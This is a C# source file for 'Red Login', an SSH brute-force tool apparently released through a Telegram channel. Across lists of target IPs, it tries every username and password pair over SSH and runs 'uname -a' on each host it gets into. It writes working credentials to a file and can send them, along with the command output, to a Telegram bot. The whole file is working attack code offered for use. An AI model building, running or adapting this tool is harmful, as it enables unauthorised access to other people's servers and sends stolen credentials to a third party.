using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Renci.SshNet;
using Renci.SshNet.Common;
namespace RedLogin
{
    class Program
    {
        public static bool Telegram = false;
        public static String Token = null;
        public static String ID = null;
        static void Main(string[] args)
        {
            try
            {
                string Title = "Red Login v1.0 | BruteForce  SSH";
                Tools.PrintLogo();
                string Hosts = args[0];
                string Usernames = args[1];
                string Passwords = args[2];
                if (args.Length > 3)
                {
                    if (args[3].ToLower() == "--telegram")
                    {
                        Telegram = true;
                        Token = args[4];
                        ID = args[5];
                        Console.Title = Title + "| Telegram Mode: Enabled";
                    }
                }
                else
                {
                    Console.Title = Title + " | Telegram Mode: Disabled";
                }
                string[] HostsList = new string[256];
                string[] UsernamesList = new string[256];
                string[] PasswordsList = new string[256];
                try
                {
                    HostsList = File.ReadAllLines(Hosts); HostsList = Tools.Clean(HostsList, true);
                    UsernamesList = File.ReadAllLines(Usernames); UsernamesList = Tools.Clean(UsernamesList, false);
                    PasswordsList = File.ReadAllLines(Passwords); PasswordsList = Tools.Clean(PasswordsList, false);
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.WriteLine("===========================");
                    Console.WriteLine("[*] Attack Start: {0}", System.DateTime.Now.ToShortTimeString());
                    Console.WriteLine("===========================");
                    Console.ForegroundColor = ConsoleColor.White;
                    Tools.Action(HostsList, UsernamesList, PasswordsList);
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.WriteLine("===========================");
                    Console.WriteLine("[*]  Attack Stop: {0}", System.DateTime.Now.ToShortTimeString());
                    Console.WriteLine("===========================");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                catch (Exception)
                {
                    if (!File.Exists(Hosts) || !File.Exists(Usernames) || !File.Exists(Passwords))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[-] File Not Found...!");
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[-] There Is No Read Access!, Try Run As Admin ...!");
                        Console.ForegroundColor = ConsoleColor.White;
                        Environment.Exit(0);
                    }

                }

            }
            catch (Exception)
            {
                Tools.PrintHelp();
                Environment.Exit(0);
            }
        }
    }
    class Tools
    {
       public static void Action(string[] IPes, string[] Usernames, string[] Passwords)
        {
            foreach (var IP in IPes)
            {
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("[*] Attempt To Brute Target {0}", IP);
                Console.ForegroundColor = ConsoleColor.White;
                bool Status = Live(IP);
                if (!Status)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\t[-] Host Dead ...!");
                    Console.ForegroundColor = ConsoleColor.White;
                }
                else
                {
                    foreach (var Username in Usernames)
                    {

                        foreach (var Password in Passwords)
                        {
                            try
                            {
                                Login(IP.ToString(), Username.ToString(), Password.ToString());
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                }

            }
        }
       public static void Login(string Host, string Username, string Password)
        {
            var SSH = new SshClient(Host, Username, Password);
            try
            {
                SSH.Connect();
                var Command = SSH.RunCommand("uname -a");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\t[+] Username: " + Username + " Password: " + Password);
                Console.ForegroundColor = ConsoleColor.White;
                SSH.Disconnect();
                Save(Host + "@" + Username + "@" + Password);
                if (Program.Telegram)
                {
                    TelegramReport(Host, Username, Password, Command.Result.Replace("\n",""));
                }
            }
            catch (SshAuthenticationException)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\t[-] Username: " + Username + " Password: " + Password);
                Console.ForegroundColor = ConsoleColor.White;
            }
            catch (Exception)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\t[-] Connection Refused By Remote Host!");
                Console.ForegroundColor = ConsoleColor.White;
                Thread.Sleep(100);
            }
            finally
            {
                SSH.Dispose();
            }
        }
        static void TelegramReport(string Host, string Username, string Password, string Command)
        {
            string Message  = "%E2%97%BD%EF%B8%8F"
                    + "Host: "
                    + Host
                    + Environment.NewLine
                    + "%E2%97%BD%EF%B8%8F"
                    + "Username: "
                    + Username
                    + Environment.NewLine
                    + "%E2%97%BD%EF%B8%8F"
                    + "Password: "
                    + Password
                    + Environment.NewLine
                    + "%E2%97%BD%EF%B8%8F"
                    + "Command Result: "
                    + Command
                    + Environment.NewLine
                    + "%23"
                    + "RedLogin "
                    + "%40" +
                    "ParsingTeam";
            var Server = "https://api.telegram.org/bot" + Program.Token + "/sendMessage?chat_id=" + Program.ID + "+&text=" + Message;
            var client = new WebClient();
            try
            {
                var Result = (client).DownloadString(Server);
            }
            catch (Exception)
            {
            }
        }

        public static void PrintLogo()
        {
            string[] Logo = {
                " ___               _     _                             ",
                "|  _`)            ( )   ( )                   _        ",
                "| (_) )   __     _| |   | |       _      __  (_)  ___  ",
                "| ,  /  /'__`)/ '_` |   | |  _  /'_`)  /'_ `)| |/' _ `)",
                "| |) ) (  ___/( (_| |   | |_( )( (_) )( (_) || || ( ) |",
                "(_) (_)`(____)`(__,_)   (____/'`)___/'`)__  |(_)(_) (_)",
                "                                      ( )_) |          ",
                "                                       )___/'          ",
                ""};
            Console.ForegroundColor = ConsoleColor.Red;
            foreach (var Line in Logo)
            {
                Console.WriteLine(Line);
                Thread.Sleep(100);
            }
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("Developer ==> Shadow" + (Environment.NewLine) + "Thanks ==> JeJe Plus, Rozhhalat" + Environment.NewLine + "Telegram Channel ==> @ParsingTeam" + (Environment.NewLine));
            Console.ForegroundColor = ConsoleColor.White;
        }
        public static void PrintHelp()
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Usage: Redlogin.exe <Targetlist.txt> <Userlist.txt> <Passlist.txt> --telegram <BotToken> <ChatID>");
            Console.ForegroundColor = ConsoleColor.White;
        }
        static void Save(string Data)
        {
            string AutoSave = "Good.txt";
            try
            {
                if (!File.Exists(AutoSave))
                {
                    using (FileStream FS = File.Create(AutoSave))
                    {
                        FS.Write(null, 0, 0);
                        Thread.Sleep(5 * 1000);
                    }
                }
                File.AppendAllText(AutoSave, Data + Environment.NewLine);
            }
            catch (Exception)
            {
            }

        }
        static bool Live(string IP)
        {
            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            client.ReceiveTimeout = 1000;
            client.SendTimeout = 1000;
            IPAddress ipAddress = IPAddress.Parse(IP);
            try
            {
                client.Connect(new IPEndPoint(ipAddress, 22));
            }
            catch (Exception)
            {
                return false;
            }
            return true;
        }
        public static string[] Clean(string[] List, bool Mode)
        {
            if (Mode)
            {
                string[] Temp = new string[List.Length];
                for (int i = 0; i < List.Length; i++)
                {
                    try
                    {
                        List[i] = List[i].Replace(" ", ""); // CleanSpace
                        IPAddress Check = IPAddress.Parse(List[i]);
                        Temp[i] = List[i];
                    }
                    catch (Exception)
                    {
                    }
                }
                int Min = 0;
                int Max = 0;
                for (int i = 0; i < Temp.Length; i++)
                {
                    if (Temp[i] != null)
                    {
                        Max++;
                    }
                }
                string[] Cleaned = new string[Max];
                for (int i = 0; i < List.Length; i++)
                {
                    if (Temp[i] != null)
                    {
                        Cleaned[Min] = Temp[i];
                        Min++;
                    }
                }
                return Cleaned;
            }
            else
            {
                string[] Temp = new string[List.Length];
                for (int i = 0; i < List.Length; i++)
                {
                    Temp[i] = List[i].Replace(" ", ""); // CleanSpace
                }
                return Temp;
            }

        }
    }
}
